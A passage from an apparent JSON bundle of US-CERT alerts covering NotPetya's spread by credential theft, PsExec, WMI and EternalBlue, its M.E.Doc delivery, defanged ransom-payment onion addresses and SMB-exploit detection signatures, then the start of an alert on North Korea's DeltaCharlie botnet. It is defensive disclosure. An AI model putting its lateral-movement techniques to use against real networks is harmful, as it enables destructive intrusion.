encrypts the compromised system’s files with a 128-bit Advanced Encryption Standard (AES) algorithm during runtime. The malware then writes a text file on the “C:\\” drive that includes a static Bitcoin wallet location as well as unique personal installation key intended for the victim to use when making the ransom payment and the user’s Bitcoin wallet ID. NotPetya modifies the master boot record (MBR) to enable encryption of the master file table (MFT) and the original MBR, and then reboots the system. Based on the encryption methods used, it appears unlikely that the files could be restored, even if the attacker received the victim’s unique key and Bitcoin wallet ID.</p><p>The delivery mechanism of NotPetya during the June 27, 2017, event was determined to be the Ukrainian tax accounting software, M.E.Doc. The cyber threat actors used a backdoor to compromise M.E. Doc’s development environment as far back as April 14, 2017. This backdoor allowed the threat actor to run arbitrary commands, exfiltrate files, and download and execute arbitrary exploits on the affected system. Organizations should treat systems with M.E.Doc installed as suspicious, and should examine these systems for additional malicious activity. <a href=\"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\">[12]</a></p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>According to multiple reports, this NotPetya malware campaign has infected organizations in several sectors, including finance, transportation, energy, commercial facilities, and healthcare. While these victims are business entities, other Windows systems are also at risk, such as:</p><ul><li>those that do not have patches installed for the vulnerabilities in MS17‑010, CVE-2017-0144, and CVE-2017-0145, and</li><li>those who operate on the  shared network of affected organizations.</li></ul><p>Negative consequences of malware infection include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>NCCIC recommends against paying ransoms; doing so enriches malicious actors while offering no guarantee that the encrypted files will be released. In this NotPetya incident, the email address for payment validation was shut down by the email provider, so payment is especially unlikely to lead to data recovery.<a href=\"https://www.bleepingcomputer.com/news/security/email-provider-shuts-down-petya-inbox-preventing-victims-from-recovering-files/\">[1]</a> According to one NCCIC stakeholder, the sites listed below sites are used for payment in this activity. These sites are not included in the CSV package as IOCs.</p><p>hxxp://mischapuk6hyrn72[.]onion/<br />hxxp://petya3jxfp2f7g3i[.]onion/<br />hxxp://petya3sen7dyko2n[.]onion/<br />hxxp://mischa5xyix2mrhd[.]onion/MZ2MMJ<br />hxxp://mischapuk6hyrn72[.]onion/MZ2MMJ<br />hxxp://petya3jxfp2f7g3i[.]onion/MZ2MMJ<br />hxxp://petya3sen7dyko2n[.]onion/MZ2MMJ</p><p><strong>Network Signatures</strong></p><p>NCCIC recommends that organizations coordinate with their security vendors to ensure appropriate coverage for this threat. Given the overlap of functionality and the similarity of behaviors between WannaCry and NotPetya, many of the available rulesets can protect against both malware types when appropriately implemented. The following rulesets provided in publically available sources may help detect activity associated with these malware types:</p><ul><li>sid:2001569, “ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection”<a href=\"http://doc.emergingthreats.net/2001569\">[2]</a></li><li>sid:2012063, “ET NETBIOS Microsoft SRV2.SYS SMB Negotiate ProcessID? Function Table Dereference (CVE-2009-3103)”<a href=\"http://doc.emergingthreats.net/bin/view/Main/2012063\">[3]</a></li><li>sid:2024297, “ET CURRENT_EVENTS ETERNALBLUE Exploit M2 MS17-010”<a href=\"http://docs.emergingthreats.net/bin/view/Main/2024297\">[4]</a></li><li>sid:42944,\"OS-WINDOWS Microsoft Windows SMB remote code execution attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li><li>sid:42340,\"OS-WINDOWS Microsoft Windows SMB anonymous session IPC share access attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li><li>sid:41984,\"OS-WINDOWS Microsoft Windows SMBv1 identical MID and FID type confusion attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li></ul><p><strong>Recommended Steps for Prevention</strong></p><p>Review US-CERT’s Alert on The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">[6]</a>, and consider implementing the following best practices:</p><ul><li>Ensure you have fully patched your systems, and confirm that you have applied Microsoft’s patch for the MS17-010 SMB vulnerability dated March 14, 2017.<a href=\"https://technet.microsoft.com/library/security/MS17-010\">[5]</a></li><li>Conduct regular backups of data and test your backups regularly as part of a comprehensive disaster recovery plan.</li><li>Ensure anti-virus and anti-malware solutions are set to automatically conduct regular scans.</li><li>Manage the use of privileged accounts. Implement the principle of least privilege. Do not assign administrative access to users unless absolutely needed. Those with a need for administrator accounts should only use them when necessary. </li><li>Configure access controls, including file, directory, and network share permissions with the principle of least privilege in mind. If a user only needs to read specific files, they should not have write access to those files, directories, or shares. </li><li>Secure use of WMI by authorizing WMI users and setting permissions.</li><li>Utilize host-based firewalls and block workstation-to-workstation communications to limit unnecessary lateral communications.</li><li>Disable or limit remote WMI and file sharing.</li><li>Block remote execution through PSEXEC.</li><li>Segregate networks and functions.</li><li>Harden network devices and secure access to infrastructure devices.</li><li>Perform out-of-band network management.</li><li>Validate integrity of hardware and software.</li><li>Disable SMBv1 and block all versions of SMB at the network boundary by blocking TCP port 445 with related protocols on UDP ports 137-138 and TCP port 139; this applies to all boundary devices.</li></ul><p><strong><em>Note:</em></strong><em> Disabling or blocking SMB may create problems by obstructing access to shared files, data, or devices. Weigh the benefits of mitigation against potential disruptions to users.</em></p><p><strong>Recommended Steps for Remediation</strong></p><ul><li>NCCIC strongly encourages organizations contact a local Federal Bureau of Investigation (FBI) field office upon discovery to report an intrusion and request assistance. Maintain and provide relevant logs.</li><li>Implement a security incident response and business continuity plan. Ideally, organizations should ensure they have appropriate backups so their response is simply to restore the data from a known clean backup. </li></ul><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov%20\">NCCICcustomerservice@hq.dhs.gov </a>or 888-282-0870. You can also report cyber crime incidents to the Internet Crime Complaint Center (IC3) at <a href=\"https://www.ic3.gov/default.aspx\">https://www.ic3.gov/default.aspx</a>.</p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://www.whitehouse.gov/briefings-statements/statement-press-secretary-25/\">Statement from the White House Press Secretary</a></li>\n\t\t\t\t\t<li><a href=\"https://www.bleepingcomputer.com/news/security/email-provider-shuts-down-petya-inbox-preventing-victims-from-recovering-files/\">[1] Bleeping Computer: Email Provider Shuts Down Petya Inbox Preventing Victims From Recovering Files</a></li>\n\t\t\t\t\t<li><a href=\"http://doc.emergingthreats.net/2001569\">[2] Emerging Threats 2001569</a></li>\n\t\t\t\t\t<li><a href=\"http://doc.emergingthreats.net/bin/view/Main/2012063\">[3] Emerging Threats 2012063</a></li>\n\t\t\t\t\t<li><a href=\"http://docs.emergingthreats.net/bin/view/Main/2024297\">[4] Emerging Threats 2024297</a></li>\n\t\t\t\t\t<li><a href=\"https://technet.microsoft.com/library/security/MS17-010\">[5] Microsoft: Security Bulletin MS17-010</a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">[6] US-CERT: The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations</a></li>\n\t\t\t\t\t<li><a href=\"https://labsblog.f-secure.com/2017/06/30/eternal-petya-from-a-developers-perspective/\">[7] F-Secure: (Eternal) Petya from a Developer’s Perspective</a></li>\n\t\t\t\t\t<li><a href=\"https://blogs.technet.microsoft.com/mmpc/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/\">[8] Microsoft |TechNet: New ransomware, old techniques: Petya adds worm capabilities </a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\">[9] US-CERT: Ransomware and Recent Variants </a></li>\n\t\t\t\t\t<li><a href=\"https://blogs.technet.microsoft.com/mmpc/2017/06/29/windows-10-platform-resilience-against-the-petya-ransomware-attack/\">[10] Microsoft: Windows 10 platform resilience against the Petya ransomware attack</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11] Talos: New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\">[12] Talos: The MeDoc Connection</a></li>\n\t\t\t\t\t<li><a href=\"https://www.dhs.gov/national-cybersecurity-and-communications-integration-center\">[13] NCCIC is the parent organization of US-CERT</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[14] New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide</a></li>\n\t\t\t\t\t<li><a href=\"https://blogs.technet.microsoft.com/msrc/2017/06/28/update-on-petya-malware-attacks/\">Microsoft:  Update on Petya Malware attacks</a></li>\n\t\t\t\t\t<li><a href=\"https://technet.microsoft.com/en-us/library/cc771551(v=ws.11).aspx\">Microsoft:  Authorize WMI users and set permissions</a></li>\n\t\t\t\t\t<li><a href=\"https://technet.microsoft.com/en-us/library/cc731011(v=ws.11).aspx\">Microsoft:  Managing WMI Security</a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\">US-CERT Alert TA16-091A</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>July 1, 2017: Initial version</li>\n\t\t\t\t\t\t<li>July 3, 2017: Updated to include MIFR-10130295_stix.xml file. Substituted TA-17-181B_IOCs.csv for TA-17-181A_IOCs.csv.</li>\n\t\t\t\t\t\t<li>July 7, 2017: Included further guidance from Microsoft in the Reference Section</li>\n\t\t\t\t\t\t<li>July 28, 2017: Revised multiple sections based on additional analysis provided</li>\n\t\t\t\t\t\t<li>February 15, 2018: Added attribution of the NotPetya malware variant to the Russian military and link to White House press statement.</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "9106 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-181A",
					"source_name": "open source",
					"description": "Original release date: July 01, 2017 | Last revised: February 15, 2018<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Microsoft Windows operating systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p><em>This Alert has been updated to reflect the U.S. Government's public attribution of the \"NotPetya\" malware variant to the Russian military. Additional information may be found in a <a href=\"https://www.whitehouse.gov/briefings-statements/statement-press-secretary-25/\">Statement from the White House Press Secretary</a>.<em> For more information related to NotPetya activity, go to <a href=\"https://www.us-cert.gov/grizzlysteppe\">https://www.us-cert.gov/grizzlysteppe</a>.</em></em></p><p>The scope of this Alert’s analysis is limited to the newest Petya malware variant that surfaced on June 27, 2017. This malware is referred to as “NotPetya” throughout this Alert.</p><p>On June 27, 2017, NCCIC <a href=\"https://www.dhs.gov/national-cybersecurity-and-communications-integration-center\">[13]</a> was notified of Petya malware events occurring in multiple countries and affecting multiple sectors. This variant of the Petya malware—referred to as NotPetya—encrypts files with extensions from a hard-coded list. Additionally, if the malware gains administrator rights, it encrypts the master boot record (MBR), making the infected Windows computers unusable. NotPetya differs from previous Petya malware primarily in its propagation methods. </p><p>The NCCIC Code Analysis Team produced a Malware Initial Findings Report (MIFR) to provide in-depth technical analysis of the malware. In coordination with public and private sector partners, NCCIC is also providing additional indicators of compromise (IOCs) in comma-separated-value (CSV) form for information sharing purposes.</p><p>Available Files:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10130295.pdf\">MIFR-10130295.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10130295_stix.xml\">MIFR-10130295_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-181B_IOCs.csv\">TA-17-181B_IOCs.csv</a></li></ul>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>NotPetya leverages multiple propagation methods to spread within an infected network. According to malware analysis, NotPetya attempts the lateral movement techniques below:</p><ul><li>PsExec - a legitimate Windows administration tool</li><li>WMI - Windows Management Instrumentation, a legitimate Windows component</li><li>EternalBlue - the same Windows SMBv1 exploit used by WannaCry</li><li>EternalRomance - another Windows SMBv1 exploit</li></ul><p>Microsoft released a security update for the <a href=\"https://technet.microsoft.com/library/security/MS17-010\">MS17-010</a> SMB vulnerability on March 14, 2017, which addressed the EternalBlue and EternalRomance lateral movement techniques.</p><p><strong>Technical Details</strong></p><p>NCCIC received a sample of the NotPetya malware variant and performed a detailed analysis. Based on the analysis, NotPetya encrypts the victim’s files with a dynamically generated, 128-bit key and creates a unique ID of the victim. However, there is no evidence of a relationship between the encryption key and the victim’s ID, which means it may not be possible for the attacker to decrypt the victim’s files even if the ransom is paid. It behaves more like destructive malware rather than ransomware.</p><p>NCCIC observed multiple methods used by NotPetya to propagate across a network. The first and—in most cases—most effective method, uses a modified version of the Mimikatz tool to steal the user’s Windows credentials. The cyber threat actor can then use the stolen credentials, along with the native Windows Management Instrumentation Command Line (WMIC) tool or the Microsoft SysInternals utility, psexec.exe, to access other systems on the network. Another method for propagation uses the EternalBlue exploit tool to target unpatched systems running a vulnerable version of SMBv1. In this case, the malware attempts to identify other hosts on the network by checking the compromised system’s IP physical address mapping table. Next, it scans for other systems that are vulnerable to the SMB exploit and installs the malicious payload. Refer to the malware report, MIFR-10130295, for more details on these methods.</p><p>The analyzed sample of NotPetya encrypts the compromised system’s files with a 128-bit Advanced Encryption Standard (AES) algorithm during runtime. The malware then writes a text file on the “C:\\” drive that includes a static Bitcoin wallet location as well as unique personal installation key intended for the victim to use when making the ransom payment and the user’s Bitcoin wallet ID. NotPetya modifies the master boot record (MBR) to enable encryption of the master file table (MFT) and the original MBR, and then reboots the system. Based on the encryption methods used, it appears unlikely that the files could be restored, even if the attacker received the victim’s unique key and Bitcoin wallet ID.</p><p>The delivery mechanism of NotPetya during the June 27, 2017, event was determined to be the Ukrainian tax accounting software, M.E.Doc. The cyber threat actors used a backdoor to compromise M.E. Doc’s development environment as far back as April 14, 2017. This backdoor allowed the threat actor to run arbitrary commands, exfiltrate files, and download and execute arbitrary exploits on the affected system. Organizations should treat systems with M.E.Doc installed as suspicious, and should examine these systems for additional malicious activity. <a href=\"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\">[12]</a></p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>According to multiple reports, this NotPetya malware campaign has infected organizations in several sectors, including finance, transportation, energy, commercial facilities, and healthcare. While these victims are business entities, other Windows systems are also at risk, such as:</p><ul><li>those that do not have patches installed for the vulnerabilities in MS17‑010, CVE-2017-0144, and CVE-2017-0145, and</li><li>those who operate on the  shared network of affected organizations.</li></ul><p>Negative consequences of malware infection include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p>NCCIC recommends against paying ransoms; doing so enriches malicious actors while offering no guarantee that the encrypted files will be released. In this NotPetya incident, the email address for payment validation was shut down by the email provider, so payment is especially unlikely to lead to data recovery.<a href=\"https://www.bleepingcomputer.com/news/security/email-provider-shuts-down-petya-inbox-preventing-victims-from-recovering-files/\">[1]</a> According to one NCCIC stakeholder, the sites listed below sites are used for payment in this activity. These sites are not included in the CSV package as IOCs.</p><p>hxxp://mischapuk6hyrn72[.]onion/<br />hxxp://petya3jxfp2f7g3i[.]onion/<br />hxxp://petya3sen7dyko2n[.]onion/<br />hxxp://mischa5xyix2mrhd[.]onion/MZ2MMJ<br />hxxp://mischapuk6hyrn72[.]onion/MZ2MMJ<br />hxxp://petya3jxfp2f7g3i[.]onion/MZ2MMJ<br />hxxp://petya3sen7dyko2n[.]onion/MZ2MMJ</p><p><strong>Network Signatures</strong></p><p>NCCIC recommends that organizations coordinate with their security vendors to ensure appropriate coverage for this threat. Given the overlap of functionality and the similarity of behaviors between WannaCry and NotPetya, many of the available rulesets can protect against both malware types when appropriately implemented. The following rulesets provided in publically available sources may help detect activity associated with these malware types:</p><ul><li>sid:2001569, “ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection”<a href=\"http://doc.emergingthreats.net/2001569\">[2]</a></li><li>sid:2012063, “ET NETBIOS Microsoft SRV2.SYS SMB Negotiate ProcessID? Function Table Dereference (CVE-2009-3103)”<a href=\"http://doc.emergingthreats.net/bin/view/Main/2012063\">[3]</a></li><li>sid:2024297, “ET CURRENT_EVENTS ETERNALBLUE Exploit M2 MS17-010”<a href=\"http://docs.emergingthreats.net/bin/view/Main/2024297\">[4]</a></li><li>sid:42944,\"OS-WINDOWS Microsoft Windows SMB remote code execution attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li><li>sid:42340,\"OS-WINDOWS Microsoft Windows SMB anonymous session IPC share access attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li><li>sid:41984,\"OS-WINDOWS Microsoft Windows SMBv1 identical MID and FID type confusion attempt\"<a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11]</a></li></ul><p><strong>Recommended Steps for Prevention</strong></p><p>Review US-CERT’s Alert on The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">[6]</a>, and consider implementing the following best practices:</p><ul><li>Ensure you have fully patched your systems, and confirm that you have applied Microsoft’s patch for the MS17-010 SMB vulnerability dated March 14, 2017.<a href=\"https://technet.microsoft.com/library/security/MS17-010\">[5]</a></li><li>Conduct regular backups of data and test your backups regularly as part of a comprehensive disaster recovery plan.</li><li>Ensure anti-virus and anti-malware solutions are set to automatically conduct regular scans.</li><li>Manage the use of privileged accounts. Implement the principle of least privilege. Do not assign administrative access to users unless absolutely needed. Those with a need for administrator accounts should only use them when necessary. </li><li>Configure access controls, including file, directory, and network share permissions with the principle of least privilege in mind. If a user only needs to read specific files, they should not have write access to those files, directories, or shares. </li><li>Secure use of WMI by authorizing WMI users and setting permissions.</li><li>Utilize host-based firewalls and block workstation-to-workstation communications to limit unnecessary lateral communications.</li><li>Disable or limit remote WMI and file sharing.</li><li>Block remote execution through PSEXEC.</li><li>Segregate networks and functions.</li><li>Harden network devices and secure access to infrastructure devices.</li><li>Perform out-of-band network management.</li><li>Validate integrity of hardware and software.</li><li>Disable SMBv1 and block all versions of SMB at the network boundary by blocking TCP port 445 with related protocols on UDP ports 137-138 and TCP port 139; this applies to all boundary devices.</li></ul><p><strong><em>Note:</em></strong><em> Disabling or blocking SMB may create problems by obstructing access to shared files, data, or devices. Weigh the benefits of mitigation against potential disruptions to users.</em></p><p><strong>Recommended Steps for Remediation</strong></p><ul><li>NCCIC strongly encourages organizations contact a local Federal Bureau of Investigation (FBI) field office upon discovery to report an intrusion and request assistance. Maintain and provide relevant logs.</li><li>Implement a security incident response and business continuity plan. Ideally, organizations should ensure they have appropriate backups so their response is simply to restore the data from a known clean backup. </li></ul><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov%20\">NCCICcustomerservice@hq.dhs.gov </a>or 888-282-0870. You can also report cyber crime incidents to the Internet Crime Complaint Center (IC3) at <a href=\"https://www.ic3.gov/default.aspx\">https://www.ic3.gov/default.aspx</a>.</p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://www.whitehouse.gov/briefings-statements/statement-press-secretary-25/\">Statement from the White House Press Secretary</a></li>\n\t\t\t\t\t<li><a href=\"https://www.bleepingcomputer.com/news/security/email-provider-shuts-down-petya-inbox-preventing-victims-from-recovering-files/\">[1] Bleeping Computer: Email Provider Shuts Down Petya Inbox Preventing Victims From Recovering Files</a></li>\n\t\t\t\t\t<li><a href=\"http://doc.emergingthreats.net/2001569\">[2] Emerging Threats 2001569</a></li>\n\t\t\t\t\t<li><a href=\"http://doc.emergingthreats.net/bin/view/Main/2012063\">[3] Emerging Threats 2012063</a></li>\n\t\t\t\t\t<li><a href=\"http://docs.emergingthreats.net/bin/view/Main/2024297\">[4] Emerging Threats 2024297</a></li>\n\t\t\t\t\t<li><a href=\"https://technet.microsoft.com/library/security/MS17-010\">[5] Microsoft: Security Bulletin MS17-010</a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">[6] US-CERT: The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations</a></li>\n\t\t\t\t\t<li><a href=\"https://labsblog.f-secure.com/2017/06/30/eternal-petya-from-a-developers-perspective/\">[7] F-Secure: (Eternal) Petya from a Developer’s Perspective</a></li>\n\t\t\t\t\t<li><a href=\"https://blogs.technet.microsoft.com/mmpc/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/\">[8] Microsoft |TechNet: New ransomware, old techniques: Petya adds worm capabilities </a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\">[9] US-CERT: Ransomware and Recent Variants </a></li>\n\t\t\t\t\t<li><a href=\"https://blogs.technet.microsoft.com/mmpc/2017/06/29/windows-10-platform-resilience-against-the-petya-ransomware-attack/\">[10] Microsoft: Windows 10 platform resilience against the Petya ransomware attack</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[11] Talos: New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.talosintelligence.com/2017/07/the-medoc-connection.html\">[12] Talos: The MeDoc Connection</a></li>\n\t\t\t\t\t<li><a href=\"https://www.dhs.gov/national-cybersecurity-and-communications-integration-center\">[13] NCCIC is the parent organization of US-CERT</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html\">[14] New Ransomware Variant \"Nyetya\" Compromises Systems Worldwide</a></li>\n\t\t\t\t\t<li><a href=\"https://blogs.technet.microsoft.com/msrc/2017/06/28/update-on-petya-malware-attacks/\">Microsoft:  Update on Petya Malware attacks</a></li>\n\t\t\t\t\t<li><a href=\"https://technet.microsoft.com/en-us/library/cc771551(v=ws.11).aspx\">Microsoft:  Authorize WMI users and set permissions</a></li>\n\t\t\t\t\t<li><a href=\"https://technet.microsoft.com/en-us/library/cc731011(v=ws.11).aspx\">Microsoft:  Managing WMI Security</a></li>\n\t\t\t\t\t<li><a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\">US-CERT Alert TA16-091A</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>July 1, 2017: Initial version</li>\n\t\t\t\t\t\t<li>July 3, 2017: Updated to include MIFR-10130295_stix.xml file. Substituted TA-17-181B_IOCs.csv for TA-17-181A_IOCs.csv.</li>\n\t\t\t\t\t\t<li>July 7, 2017: Included further guidance from Microsoft in the Reference Section</li>\n\t\t\t\t\t\t<li>July 28, 2017: Revised multiple sections based on additional analysis provided</li>\n\t\t\t\t\t\t<li>February 15, 2018: Added attribution of the NotPetya malware variant to the Russian military and link to White House press statement.</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-07-01T05:41:37.000Z"
		},
		{
			"type": "report",
			"title": "TA17-164A: HIDDEN COBRA – North Korea’s DDoS Botnet Infrastructure",
			"name": "TA17-164A: HIDDEN COBRA – North Korea’s DDoS Botnet Infrastructure",
			"id": "report-9a0b27b8-c771-4a5a-8508-b3b0348ddedb",
			"description": "Original release date: June 13, 2017 | Last revised: August 23, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Networked Systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides technical details on the tools and infrastructure used by cyber actors of the North Korean government to target the media, aerospace, financial, and critical infrastructure sectors in the United States and globally. Working with U.S. Government partners, DHS and FBI identified Internet Protocol (IP) addresses associated with a malware variant, known as DeltaCharlie, used to manage North Korea’s distributed denial-of-service (DDoS) botnet infrastructure. This alert contains indicators of compromise (IOCs), malware descriptions, network signatures, and host-based rules to help network defenders detect activity conducted by the North Korean government. The U.S. Government refers to the malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information related to HIDDEN COBRA activity, go to <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>If users or administrators detect the custom tools indicative of HIDDEN COBRA, these tools should be immediately flagged, reported to the DHS National Cybersecurity Communications and Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and given highest priority for enhanced mitigation. This alert identifies IP addresses linked to systems infected with DeltaCharlie malware and provides descriptions of the malware and associated malware signatures. DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network. FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.</p><p>This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S. Government.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-164A_csv.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-164A_stix.xml\">.stix</a>)</li></ul><p>On August 23, 2017, DHS published a Malware Analysis Report (MAR-10132963) that examines malware functionality to provide detailed code analysis and insight into specific tactics, techniques, and procedures (TTPs) observed in the malware.</p><p>For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963.pdf\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10132963_stix.xml\">.stix</a>)</li></ul>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>Since 2009, HIDDEN COBRA actors have leveraged their capabilities to target and compromise a range of victims; some intrusions have resulted in the exfiltration of data while others have been disruptive in nature. Commercial reporting has referred to this activity as Lazarus Group<a href=\"https://exchange.xforce.ibmcloud.com/collection/Actor-Lazarus-Group-0bf5e50d24445f94d6b2d744dc6c63a2\">[1]</a> and Guardians of Peace.<a href=\"https://www.alienvault.com/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks\">[2]</a> DHS and FBI assess that HIDDEN COBRA actors will continue to use cyber operations to advance their government’s military and strategic objectives. Cyber analysts are encouraged to review the information provided in this alert to detect signs of malicious network activity.</p><p>Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware. Variants of malware and tools used by HIDDEN COBRA actors include Destover,<a href=\"https://www.symantec.com/connect/blogs/destover-destructive-malware-has-links-attacks-south-korea\">[3]</a> Wild Positron/Duuzer,<a href=\"https://www.symantec.com/connect/blogs/duuzer-back-door-trojan-targets-south-korea-take-over-computers\">[4]</a> and Hangman.<a href=\"https://www.fireeye.com/blog/threat-research/2015/09/zero-day_hwp_exploit.html\">[5]</a> DHS has previously released Alert TA14-353A,<a href=\"https://www.us-cert.gov/ncas/alerts/TA14-353A\">[6]</a> which contains additional details on the use of a server message block (SMB) worm tool employed by these actors. Further research is needed to understand the full breadth of this group’s cyber capabilities. In particular, DHS recommends that more research should be conducted on the North Korean cyber activity that has been reported by cybersecurity and threat research firms.</p><p>HIDDEN COBRA actors commonly target systems running older, unsupported versions of Microsoft operating systems. The multiple vulnerabilities in these older systems provide cyber actors many targets for exploitation. These actors have also used Adobe Flash player vulnerabilities to gain initial entry into users’ environments.</p><p>HIDDEN COBRA is known to use vulnerabilities affecting various applications. These vulnerabilities include:</p><ul><li>CVE-2015-6585: Hangul Word Processor Vulnerability</li><li>CVE-2015-8651: Adobe Flash Player 18.0.0.324 and 19.x Vulnerability</li><li>CVE-2016-0034: Microsoft Silverlight 5.1.41212.0 Vulnerability</li><li>CVE-2016-1019: Adobe Flash Player 21.0.0.197 Vulnerability</li><li>CVE-2016-4117: Adobe Flash Player 21.0.0.226 Vulnerability</li></ul><p>DHS recommends that organizations upgrade these applications to the latest version and patch level. If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.</p><p>The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie. The DeltaCharlie DDoS bot was originally reported by Novetta in their 2016 Operation Blockbuster Malware Report.<a href=\"https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\">[7]</a> This malware has used the IP addresses identified in the accompanying .csv and .stix files as both source and destination IPs. In some instances, the malware may have been present on victims’ networks for a significant period.</p><p><strong><em>Technical Details</em></strong></p><p>DeltaCharlie is a DDoS tool used by HIDDEN COBRA actors, and is referenced and detailed in Novetta’s Operation Blockbuster Destructive Malware report. The information related to DeltaCharlie from the Operation 